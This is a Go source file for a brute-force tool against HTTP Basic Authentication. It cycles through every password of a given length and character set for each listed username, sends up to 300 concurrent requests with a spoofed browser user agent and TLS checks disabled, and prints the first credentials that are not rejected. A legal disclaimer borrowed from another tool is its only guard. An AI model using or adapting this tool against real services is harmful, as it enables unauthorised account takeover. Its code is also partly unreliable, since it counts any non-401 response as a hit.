package main

import (
	"bufio"
	"crypto/tls"
	b64 "encoding/base64"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

func printBanner() {
	colorReset := "\033[0m"

	colorRed := "\033[31m"
	colorGreen := "\033[32m"
	colorYellow := "\033[33m"
	colorBlue := "\033[34m"
	colorPurple := "\033[35m"
	colorCyan := "\033[36m"
	// colorWhite := "\033[37m"

	fmt.Println(string(colorCyan), "\n\n                 ██████╗  ██████╗ ██╗  ██╗ ██████╗  ██╗ v1.2")
	fmt.Println(string(colorCyan), "               ██╔════╝ ██╔═══██╗██║  ██║██╔═████╗███║")
	fmt.Println(string(colorCyan), "               ██║  ███╗██║   ██║███████║██║██╔██║╚██║")
	fmt.Println(string(colorCyan), "               ██║   ██║██║   ██║╚════██║████╔╝██║ ██║")
	fmt.Println(string(colorCyan), "               ╚██████╔╝╚██████╔╝     ██║╚██████╔╝ ██║")
	fmt.Println(string(colorCyan), "                ╚═════╝  ╚═════╝      ╚═╝ ╚═════╝  ╚═╝\n")
	fmt.Println(string(colorYellow), "                卍 A powerfull BasicAuth Bruter 卍")
	fmt.Println(string(colorYellow), "           auto pass generator - Needless from pass list")
	fmt.Println(string(colorYellow), "                      by: github.com/alyrezo\n")
	fmt.Println(string(colorGreen), "  ╔════════════════════════════════════════════════════════════════")
	fmt.Println(string(colorGreen), "  ║", string(colorRed), "[!] legal disclaimer:")
	fmt.Println(string(colorGreen), "  ║", string(colorRed), "[1] Usage of pydictor for attacking targets without prior mutual consent is illegal.")
	fmt.Println(string(colorGreen), "  ║", string(colorRed), "[2] It is the end user's responsibility to obey all applicable local, state and federal laws.")
	fmt.Println(string(colorGreen), "  ║", string(colorRed), "[3] Developers assume no liability and are not responsible for any misuse or damage caused by this program.")
	fmt.Println(string(colorGreen), "  ╟╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╼")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[#] Usage:", string(colorCyan), "main.exe -debug=true -continue=false -c 300 -d 60 -t 10 -u username.txt -passchars=abcdefghijklmnopqrstuvwxyz0123456789 -passlen=8 -url http://127.0.0.1:9903/form")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-debug", string(colorBlue), "=>", string(colorCyan), "show failed attempts + errors")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-c", string(colorBlue), "=>", string(colorCyan), "concurrency (threads)")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-d", string(colorBlue), "=>", string(colorCyan), "delay between request [milliseconds]")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-t", string(colorBlue), "=>", string(colorCyan), "timeout [seconds]")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-u", string(colorBlue), "=>", string(colorCyan), "path to username file")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-continue", string(colorBlue), "=>", string(colorCyan), "continue cracking from last state [only if state.json exists]")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-passchars", string(colorBlue), "=>", string(colorCyan), "password chracters")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-passlen", string(colorBlue), "=>", string(colorCyan), "password length")
	fmt.Println(string(colorGreen), "  ║", string(colorBlue), "[>]", string(colorPurple), "-url", string(colorBlue), "=>", string(colorCyan), ":) ")
	fmt.Println(string(colorGreen), "  ╚════════════════════════════════════════════════════════════════", string(colorReset))
}

func main() {
	if len(os.Args) != 15 {
		printBanner()
		os.Exit(0)
	}
	var debugMode bool
	var threadsCount int
	var delay int
	var timeout int
	var userListPath string
	var continueState bool
	var passChars string
	var passLen int
	var url string
	flag.BoolVar(&debugMode, "debug", true, "debug mode")
	flag.IntVar(&threadsCount, "c", 300, "number of threads")
	flag.IntVar(&delay, "d", 20, "delay")
	flag.IntVar(&timeout, "t", 10, "timeout")
	flag.StringVar(&userListPath, "u", "users.txt", "users file path")
	flag.BoolVar(&continueState, "continue", false, "continue last state")
	flag.StringVar(&passChars, "passchars", "abcdefghijklmnopqrstuvwxyz0123456789", "password characters")
	flag.IntVar(&passLen, "passlen", 8, "password length")
	flag.StringVar(&url, "url", "", "url")
	flag.Parse()
	userFile, err := os.Open(userListPath)
	if err != nil {
		fmt.Println("Error opening users file !")
		os.Exit(0)
	}
	defer userFile.Close()
	bruter := NewBasicAuthBruter(url, userFile, threadsCount, time.Duration(delay)*time.Millisecond, time.Duration(timeout)*time.Second, debugMode, passChars, passLen, continueState)
	bruter.Start()
}

var mux2 sync.Mutex

type PasswordGenerator struct {
	PassChars []byte
	PassLen   int
	PassState map[int]int
	StateFile *os.File
}

func NewPasswordGenerator(passChars string, passLen int, loadState bool) *PasswordGenerator {
	if loadState {
		file, err := ioutil.ReadFile("state.json")
		if err != nil {
			log.Println("cannot load state.json !")
			os.Exit(0)
		}

		data := map[int]int{}

		err = json.Unmarshal([]byte(file), &data)
		if err != nil {
			log.Println("invalid json structure !")
			os.Exit(0)
		}

		p := &PasswordGenerator{
			PassChars: []byte(passChars),
			PassLen:   passLen,
			PassState: data,
		}
		return p
	} else {
		p := &PasswordGenerator{
			PassChars: []byte(passChars),
			PassLen:   passLen,
			PassState: map[int]int{},
		}
		for i := 0; i < p.PassLen; i++ {
			p.PassState[i] = 0
		}
		return p
	}
}

func (p *PasswordGenerator) GenPassword() string {
	pass := make([]byte, p.PassLen)
	mux2.Lock()
	for i := 0; i < p.PassLen; i++ {
		pass[i] = p.PassChars[p.PassState[i]]
	}
	for i := p.PassLen - 1; i >= 0; i-- {
		if p.PassState[i] != len(p.PassChars)-1 {
			p.PassState[i]++
			break
		} else {
			p.PassState[i] = 0
			continue
		}
	}
	mux2.Unlock()
	return string(pass)
}

func (p PasswordGenerator) GetFinalPassword() string {
	pass := make([]byte, p.PassLen)
	for i := 0; i < p.PassLen; i++ {
		pass[i] = p.PassChars[len(p.PassChars)-1]
	}
	return string(pass)
}

func (p *PasswordGenerator) SaveState() {
	mux2.Lock()
	file, _ := json.MarshalIndent(p.PassState, "", " ")
	_ = ioutil.WriteFile("state.json", file, 0644)
	mux2.Unlock()
}

var mux sync.Mutex

type BasicAuthBruter struct {
	Url            string
	UsernameFile   *os.File
	InputChan      chan string
	ErrorChan      chan error
	BadResultsChan chan string
	FoundChan      chan string
	Threads        int
	ActiveWorkers  int
	PassGen        *PasswordGenerator
	Delay          time.Duration
	Timeout        time.Duration
	DebugMode      bool
}

func NewBasicAuthBruter(url string, userNameFile *os.File, threads int, delay time.Duration, timeout time.Duration, debugMode bool, passChars string, passLen int, loadState bool) *BasicAuthBruter {
	return &BasicAuthBruter{
		Url:            url,
		UsernameFile:   userNameFile,
		InputChan:      make(chan string),
		ErrorChan:      make(chan error),
		BadResultsChan: make(chan string),
		FoundChan:      make(chan string),
		Threads:        threads,
		ActiveWorkers:  0,
		PassGen:        NewPasswordGenerator(passChars, passLen, loadState),
		Delay:          delay,
		Timeout:        timeout,
		DebugMode:      debugMode,
	}
}

func (b *BasicAuthBruter) Start() {
	status := true
	// worker manager
	go func() {
		for status {
			if b.ActiveWorkers <= b.Threads {
				tmpSlice := strings.Split(<-b.InputChan, ":")
				b.PassGen.SaveState()
				go b.Check(tmpSlice[0], tmpSlice[1])
			}
		}
	}()

	//status checker
	go func() {
		colorReset := "\033[0m"

		colorRed := "\033[31m"
		colorGreen := "\033[32m"
		colorYellow := "\033[33m"

		for status {
			select {
			case err := <-b.ErrorChan:
				if b.DebugMode {
					log.Println(string(colorRed), "Error:", err, string(colorReset))
				}
			case bad := <-b.BadResultsChan:
				if b.DebugMode {
					log.Println(string(colorYellow), "Wrong credentials:", bad, string(colorReset))
				}
			case good := <-b.FoundChan:
				log.Println(string(colorGreen), "Found: credentials:", good, string(colorReset))
				os.Exit(0)
			}
		}
	}()

	go func() {
		uFile := bufio.NewScanner(b.UsernameFile)
		for uFile.Scan() {
			currentUsername := uFile.Text()
			for {
				tmpPass := b.PassGen.GenPassword()
				if tmpPass != b.PassGen.GetFinalPassword() {
					b.InputChan <- fmt.Sprintf("%s:%s", currentUsername, tmpPass)
				} else {
					b.InputChan <- fmt.Sprintf("%s:%s", currentUsername, tmpPass)
					break
				}
			}

		}
	}()

	for status {
		time.Sleep(time.Second * 1)
		if b.ActiveWorkers == 0 {
			status = false
			break
		}
	}
}

func (b *BasicAuthBruter) Check(username string, password string) {
	mux.Lock()
	b.ActiveWorkers++
	mux.Unlock()
	req, err := http.NewRequest(
		"GET",
		b.Url,
		nil,
	)
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: b.Timeout,
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
	sEnc := b64.StdEncoding.EncodeToString([]byte(fmt.Sprintf("%s:%s", username, password)))
	req.Header.Set("Authorization", fmt.Sprintf("Basic %s", sEnc))

	time.Sleep(b.Delay)

	resp, err := client.Do(req)
	if err != nil {
		b.ErrorChan <- errors.New(fmt.Sprintf("error in sending http request ║ %s:%s", username, password))
		mux.Lock()
		b.ActiveWorkers--
		mux.Unlock()
		return
	}
	if resp.StatusCode == 401 {
		b.BadResultsChan <- fmt.Sprintf("%s:%s", username, password)
		_ = resp.Body.Close()
		mux.Lock()
		b.ActiveWorkers--
		mux.Unlock()
		return
	} else {
		b.FoundChan <- fmt.Sprintf("%s:%s", username, password)
		_ = resp.Body.Close()
		mux.Lock()
		b.ActiveWorkers--
		mux.Unlock()
		return
	}
}
